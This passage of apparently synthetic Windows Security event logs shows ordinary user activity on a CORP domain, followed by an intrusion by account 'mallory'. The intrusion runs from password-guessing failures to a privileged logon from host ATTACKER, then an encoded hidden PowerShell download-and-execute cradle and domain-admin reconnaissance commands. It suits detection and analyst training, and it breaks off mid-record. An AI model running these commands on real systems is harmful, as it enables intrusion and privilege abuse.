  {
    "@timestamp": "2026-04-01T08:12:00Z",
    "Hostname": "DC01",
    "EventID": 4624,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "ivan",
    "TargetLogonId": "0xBA7C34A",
    "LogonType": 2,
    "IpAddress": "10.0.2.110",
    "WorkstationName": "DC01",
    "LogonGuid": "{DC96925E-7F4F-6218-6163-E5B0894A05E4}",
    "ProcessName": "C:\\Windows\\System32\\winlogon.exe",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account was successfully logged on.\nSubject:\n  Account Name: -\n  Logon ID: 0x0\nNew Logon:\n  Account Name: ivan\n  Account Domain: CORP\n  Logon ID: 0xBA7C34A\n  Logon GUID: {DC96925E-7F4F-6218-6163-E5B0894A05E4}\nLogon Type: 2\nNetwork Information:\n  Workstation Name: DC01\n  Source Network Address: 10.0.2.110"
  },
  {
    "@timestamp": "2026-04-01T08:12:02Z",
    "Hostname": "DC01",
    "EventID": 4672,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "ivan",
    "SubjectLogonId": "0xBA7C34A",
    "PrivilegeList": "SeAuditPrivilege",
    "raw_message": "Special privileges assigned to new logon.\n  Account Name: ivan\n  Logon ID: 0xBA7C34A\n  Privileges: SeAuditPrivilege"
  },
  {
    "@timestamp": "2026-04-01T08:14:00Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "ivan",
    "SubjectLogonId": "0xBA7C34A",
    "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --profile-directory=Default",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: ivan\n  Logon ID: 0xBA7C34A\nProcess Information:\n  New Process Name: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n  Command Line: chrome.exe --profile-directory=Default\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:18:45Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "ivan",
    "SubjectLogonId": "0xBA7C34A",
    "NewProcessName": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: ivan\n  Logon ID: 0xBA7C34A\nProcess Information:\n  New Process Name: C:\\Windows\\explorer.exe\n  Command Line: explorer.exe\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:26:48Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "ivan",
    "SubjectLogonId": "0xBA7C34A",
    "NewProcessName": "C:\\Windows\\System32\\notepad.exe",
    "CommandLine": "notepad.exe note.txt",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: ivan\n  Logon ID: 0xBA7C34A\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\notepad.exe\n  Command Line: notepad.exe note.txt\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:28:58Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "ivan",
    "SubjectLogonId": "0xBA7C34A",
    "NewProcessName": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: ivan\n  Logon ID: 0xBA7C34A\nProcess Information:\n  New Process Name: C:\\Windows\\explorer.exe\n  Command Line: explorer.exe\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:38:41Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "ivan",
    "SubjectLogonId": "0xBA7C34A",
    "NewProcessName": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: ivan\n  Logon ID: 0xBA7C34A\nProcess Information:\n  New Process Name: C:\\Windows\\explorer.exe\n  Command Line: explorer.exe\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:40:46Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "ivan",
    "SubjectLogonId": "0xBA7C34A",
    "NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "OUTLOOK.EXE -profile Default",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: ivan\n  Logon ID: 0xBA7C34A\nProcess Information:\n  New Process Name: C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\n  Command Line: OUTLOOK.EXE -profile Default\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:48:06Z",
    "Hostname": "FILESERVER",
    "EventID": 4624,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "ivan",
    "TargetLogonId": "0x7B4A4E3",
    "LogonType": 3,
    "IpAddress": "10.0.2.110",
    "WorkstationName": "DC01",
    "LogonGuid": "{DC96925E-7F4F-6218-6163-E5B0894A05E4}",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account was successfully logged on.\nSubject:\n  Account Name: -\n  Logon ID: 0x0\nNew Logon:\n  Account Name: ivan\n  Account Domain: CORP\n  Logon ID: 0x7B4A4E3\n  Logon GUID: {DC96925E-7F4F-6218-6163-E5B0894A05E4}\nLogon Type: 3\nNetwork Information:\n  Workstation Name: DC01\n  Source Network Address: 10.0.2.110"
  },
  {
    "@timestamp": "2026-04-01T08:48:16Z",
    "Hostname": "FILESERVER",
    "EventID": 4634,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "ivan",
    "TargetLogonId": "0x7B4A4E3",
    "LogonType": 3,
    "raw_message": "An account was logged off.\n  Account Name: ivan\n  Logon ID: 0x7B4A4E3\n  Logon Type: 3"
  },
  {
    "@timestamp": "2026-04-01T12:44:06Z",
    "Hostname": "DC01",
    "EventID": 4634,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "ivan",
    "TargetLogonId": "0xBA7C34A",
    "LogonType": 2,
    "raw_message": "An account was logged off.\n  Account Name: ivan\n  Logon ID: 0xBA7C34A\n  Logon Type: 2"
  },
  {
    "@timestamp": "2026-04-01T08:05:00Z",
    "Hostname": "DC01",
    "EventID": 4624,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "judy",
    "TargetLogonId": "0x611461E",
    "LogonType": 2,
    "IpAddress": "10.0.2.77",
    "WorkstationName": "DC01",
    "LogonGuid": "{63F2AE24-E8F6-920C-D894-4F417C967F79}",
    "ProcessName": "C:\\Windows\\System32\\winlogon.exe",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account was successfully logged on.\nSubject:\n  Account Name: -\n  Logon ID: 0x0\nNew Logon:\n  Account Name: judy\n  Account Domain: CORP\n  Logon ID: 0x611461E\n  Logon GUID: {63F2AE24-E8F6-920C-D894-4F417C967F79}\nLogon Type: 2\nNetwork Information:\n  Workstation Name: DC01\n  Source Network Address: 10.0.2.77"
  },
  {
    "@timestamp": "2026-04-01T08:05:02Z",
    "Hostname": "DC01",
    "EventID": 4672,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "judy",
    "SubjectLogonId": "0x611461E",
    "PrivilegeList": "SeAuditPrivilege",
    "raw_message": "Special privileges assigned to new logon.\n  Account Name: judy\n  Logon ID: 0x611461E\n  Privileges: SeAuditPrivilege"
  },
  {
    "@timestamp": "2026-04-01T08:07:00Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "judy",
    "SubjectLogonId": "0x611461E",
    "NewProcessName": "C:\\Windows\\System32\\notepad.exe",
    "CommandLine": "notepad.exe note.txt",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: judy\n  Logon ID: 0x611461E\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\notepad.exe\n  Command Line: notepad.exe note.txt\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:16:45Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "judy",
    "SubjectLogonId": "0x611461E",
    "NewProcessName": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: judy\n  Logon ID: 0x611461E\nProcess Information:\n  New Process Name: C:\\Windows\\explorer.exe\n  Command Line: explorer.exe\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:22:36Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "judy",
    "SubjectLogonId": "0x611461E",
    "NewProcessName": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: judy\n  Logon ID: 0x611461E\nProcess Information:\n  New Process Name: C:\\Windows\\explorer.exe\n  Command Line: explorer.exe\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:23:57Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "judy",
    "SubjectLogonId": "0x611461E",
    "NewProcessName": "C:\\Windows\\System32\\notepad.exe",
    "CommandLine": "notepad.exe note.txt",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: judy\n  Logon ID: 0x611461E\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\notepad.exe\n  Command Line: notepad.exe note.txt\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:41:35Z",
    "Hostname": "FILESERVER",
    "EventID": 4624,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "judy",
    "TargetLogonId": "0xDA5BD9C",
    "LogonType": 3,
    "IpAddress": "10.0.2.77",
    "WorkstationName": "DC01",
    "LogonGuid": "{63F2AE24-E8F6-920C-D894-4F417C967F79}",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account was successfully logged on.\nSubject:\n  Account Name: -\n  Logon ID: 0x0\nNew Logon:\n  Account Name: judy\n  Account Domain: CORP\n  Logon ID: 0xDA5BD9C\n  Logon GUID: {63F2AE24-E8F6-920C-D894-4F417C967F79}\nLogon Type: 3\nNetwork Information:\n  Workstation Name: DC01\n  Source Network Address: 10.0.2.77"
  },
  {
    "@timestamp": "2026-04-01T08:41:45Z",
    "Hostname": "FILESERVER",
    "EventID": 4634,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "judy",
    "TargetLogonId": "0xDA5BD9C",
    "LogonType": 3,
    "raw_message": "An account was logged off.\n  Account Name: judy\n  Logon ID: 0xDA5BD9C\n  Logon Type: 3"
  },
  {
    "@timestamp": "2026-04-01T10:32:35Z",
    "Hostname": "DC01",
    "EventID": 4634,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "judy",
    "TargetLogonId": "0x611461E",
    "LogonType": 2,
    "raw_message": "An account was logged off.\n  Account Name: judy\n  Logon ID: 0x611461E\n  Logon Type: 2"
  },
  {
    "@timestamp": "2026-04-01T08:30:00Z",
    "Hostname": "DC01",
    "EventID": 4624,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "oscar",
    "TargetLogonId": "0x82110C6",
    "LogonType": 2,
    "IpAddress": "10.0.5.22",
    "WorkstationName": "DC01",
    "LogonGuid": "{2F923996-22CB-786C-CEBB-145998326856}",
    "ProcessName": "C:\\Windows\\System32\\winlogon.exe",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account was successfully logged on.\nSubject:\n  Account Name: -\n  Logon ID: 0x0\nNew Logon:\n  Account Name: oscar\n  Account Domain: CORP\n  Logon ID: 0x82110C6\n  Logon GUID: {2F923996-22CB-786C-CEBB-145998326856}\nLogon Type: 2\nNetwork Information:\n  Workstation Name: DC01\n  Source Network Address: 10.0.5.22"
  },
  {
    "@timestamp": "2026-04-01T08:30:02Z",
    "Hostname": "DC01",
    "EventID": 4672,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "oscar",
    "SubjectLogonId": "0x82110C6",
    "PrivilegeList": "SeAuditPrivilege",
    "raw_message": "Special privileges assigned to new logon.\n  Account Name: oscar\n  Logon ID: 0x82110C6\n  Privileges: SeAuditPrivilege"
  },
  {
    "@timestamp": "2026-04-01T08:34:00Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "oscar",
    "SubjectLogonId": "0x82110C6",
    "NewProcessName": "C:\\Windows\\System32\\notepad.exe",
    "CommandLine": "notepad.exe note.txt",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: oscar\n  Logon ID: 0x82110C6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\notepad.exe\n  Command Line: notepad.exe note.txt\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:43:25Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "oscar",
    "SubjectLogonId": "0x82110C6",
    "NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "EXCEL.EXE report.xlsx",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: oscar\n  Logon ID: 0x82110C6\nProcess Information:\n  New Process Name: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\n  Command Line: EXCEL.EXE report.xlsx\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:48:22Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "oscar",
    "SubjectLogonId": "0x82110C6",
    "NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "OUTLOOK.EXE -profile Default",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: oscar\n  Logon ID: 0x82110C6\nProcess Information:\n  New Process Name: C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\n  Command Line: OUTLOOK.EXE -profile Default\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:54:13Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "oscar",
    "SubjectLogonId": "0x82110C6",
    "NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "OUTLOOK.EXE -profile Default",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: oscar\n  Logon ID: 0x82110C6\nProcess Information:\n  New Process Name: C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\n  Command Line: OUTLOOK.EXE -profile Default\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T08:59:14Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "oscar",
    "SubjectLogonId": "0x82110C6",
    "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --profile-directory=Default",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: oscar\n  Logon ID: 0x82110C6\nProcess Information:\n  New Process Name: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n  Command Line: chrome.exe --profile-directory=Default\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T09:01:58Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "oscar",
    "SubjectLogonId": "0x82110C6",
    "NewProcessName": "C:\\Program Files\\7-Zip\\7zFM.exe",
    "CommandLine": "7zFM.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: oscar\n  Logon ID: 0x82110C6\nProcess Information:\n  New Process Name: C:\\Program Files\\7-Zip\\7zFM.exe\n  Command Line: 7zFM.exe\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T09:07:35Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "oscar",
    "SubjectLogonId": "0x82110C6",
    "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --profile-directory=Default",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: oscar\n  Logon ID: 0x82110C6\nProcess Information:\n  New Process Name: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n  Command Line: chrome.exe --profile-directory=Default\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T09:13:28Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "oscar",
    "SubjectLogonId": "0x82110C6",
    "NewProcessName": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: oscar\n  Logon ID: 0x82110C6\nProcess Information:\n  New Process Name: C:\\Windows\\explorer.exe\n  Command Line: explorer.exe\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T09:14:07Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "oscar",
    "SubjectLogonId": "0x82110C6",
    "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --profile-directory=Default",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: oscar\n  Logon ID: 0x82110C6\nProcess Information:\n  New Process Name: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n  Command Line: chrome.exe --profile-directory=Default\n  Creator Process Name: C:\\Windows\\explorer.exe"
  },
  {
    "@timestamp": "2026-04-01T09:25:19Z",
    "Hostname": "FILESERVER",
    "EventID": 4624,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "oscar",
    "TargetLogonId": "0x36A147E",
    "LogonType": 3,
    "IpAddress": "10.0.5.22",
    "WorkstationName": "DC01",
    "LogonGuid": "{2F923996-22CB-786C-CEBB-145998326856}",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account was successfully logged on.\nSubject:\n  Account Name: -\n  Logon ID: 0x0\nNew Logon:\n  Account Name: oscar\n  Account Domain: CORP\n  Logon ID: 0x36A147E\n  Logon GUID: {2F923996-22CB-786C-CEBB-145998326856}\nLogon Type: 3\nNetwork Information:\n  Workstation Name: DC01\n  Source Network Address: 10.0.5.22"
  },
  {
    "@timestamp": "2026-04-01T09:25:29Z",
    "Hostname": "FILESERVER",
    "EventID": 4634,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "oscar",
    "TargetLogonId": "0x36A147E",
    "LogonType": 3,
    "raw_message": "An account was logged off.\n  Account Name: oscar\n  Logon ID: 0x36A147E\n  Logon Type: 3"
  },
  {
    "@timestamp": "2026-04-01T12:16:19Z",
    "Hostname": "DC01",
    "EventID": 4634,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "oscar",
    "TargetLogonId": "0x82110C6",
    "LogonType": 2,
    "raw_message": "An account was logged off.\n  Account Name: oscar\n  Logon ID: 0x82110C6\n  Logon Type: 2"
  },
  {
    "@timestamp": "2026-04-01T12:12:00Z",
    "Hostname": "WS02",
    "EventID": 4625,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "mallory",
    "TargetLogonId": "0x0",
    "LogonType": 3,
    "IpAddress": "203.0.113.66",
    "WorkstationName": "-",
    "SubStatus": "0xC000006A",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
  },
  {
    "@timestamp": "2026-04-01T12:12:07Z",
    "Hostname": "WS02",
    "EventID": 4625,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "mallory",
    "TargetLogonId": "0x0",
    "LogonType": 3,
    "IpAddress": "203.0.113.66",
    "WorkstationName": "-",
    "SubStatus": "0xC000006A",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
  },
  {
    "@timestamp": "2026-04-01T12:12:14Z",
    "Hostname": "WS02",
    "EventID": 4625,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "mallory",
    "TargetLogonId": "0x0",
    "LogonType": 3,
    "IpAddress": "203.0.113.66",
    "WorkstationName": "-",
    "SubStatus": "0xC000006A",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
  },
  {
    "@timestamp": "2026-04-01T12:12:21Z",
    "Hostname": "WS02",
    "EventID": 4625,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "mallory",
    "TargetLogonId": "0x0",
    "LogonType": 3,
    "IpAddress": "203.0.113.66",
    "WorkstationName": "-",
    "SubStatus": "0xC000006A",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
  },
  {
    "@timestamp": "2026-04-01T12:12:28Z",
    "Hostname": "WS02",
    "EventID": 4625,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "mallory",
    "TargetLogonId": "0x0",
    "LogonType": 3,
    "IpAddress": "203.0.113.66",
    "WorkstationName": "-",
    "SubStatus": "0xC000006A",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
  },
  {
    "@timestamp": "2026-04-01T12:12:35Z",
    "Hostname": "WS02",
    "EventID": 4625,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "mallory",
    "TargetLogonId": "0x0",
    "LogonType": 3,
    "IpAddress": "203.0.113.66",
    "WorkstationName": "-",
    "SubStatus": "0xC000006A",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
  },
  {
    "@timestamp": "2026-04-01T12:13:00Z",
    "Hostname": "WS02",
    "EventID": 4624,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "mallory",
    "TargetLogonId": "0x21F8AC6",
    "LogonType": 3,
    "IpAddress": "203.0.113.66",
    "WorkstationName": "ATTACKER",
    "LogonGuid": "{EEEA163E-2338-7D12-BD32-50C448F4EF12}",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account was successfully logged on.\nSubject:\n  Account Name: -\n  Logon ID: 0x0\nNew Logon:\n  Account Name: mallory\n  Account Domain: CORP\n  Logon ID: 0x21F8AC6\n  Logon GUID: {EEEA163E-2338-7D12-BD32-50C448F4EF12}\nLogon Type: 3\nNetwork Information:\n  Workstation Name: ATTACKER\n  Source Network Address: 203.0.113.66"
  },
  {
    "@timestamp": "2026-04-01T12:13:02Z",
    "Hostname": "WS02",
    "EventID": 4672,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "mallory",
    "SubjectLogonId": "0x21F8AC6",
    "PrivilegeList": "SeDebugPrivilege,SeImpersonatePrivilege,SeTcbPrivilege",
    "raw_message": "Special privileges assigned to new logon.\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\n  Privileges: SeDebugPrivilege,SeImpersonatePrivilege,SeTcbPrivilege"
  },
  {
    "@timestamp": "2026-04-01T12:13:15Z",
    "Hostname": "WS02",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "mallory",
    "SubjectLogonId": "0x21F8AC6",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c whoami /all",
    "ParentProcessName": "C:\\Windows\\System32\\services.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\cmd.exe\n  Command Line: cmd.exe /c whoami /all\n  Creator Process Name: C:\\Windows\\System32\\services.exe"
  },
  {
    "@timestamp": "2026-04-01T12:13:25Z",
    "Hostname": "WS02",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "mallory",
    "SubjectLogonId": "0x21F8AC6",
    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Command Line: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n  Creator Process Name: C:\\Windows\\System32\\cmd.exe"
  },
  {
    "@timestamp": "2026-04-01T12:13:36Z",
    "Hostname": "WS02",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "mallory",
    "SubjectLogonId": "0x21F8AC6",
    "NewProcessName": "C:\\Windows\\System32\\net.exe",
    "CommandLine": "net.exe view /domain",
    "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\net.exe\n  Command Line: net.exe view /domain\n  Creator Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
  },
  {
    "@timestamp": "2026-04-01T12:13:43Z",
    "Hostname": "WS02",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "mallory",
    "SubjectLogonId": "0x21F8AC6",
    "NewProcessName": "C:\\Windows\\System32\\net.exe",
    "CommandLine": "net.exe group \"Domain Admins\" /domain",
    "ParentProcessName": "C:\\Windows\\System32\\net.exe",
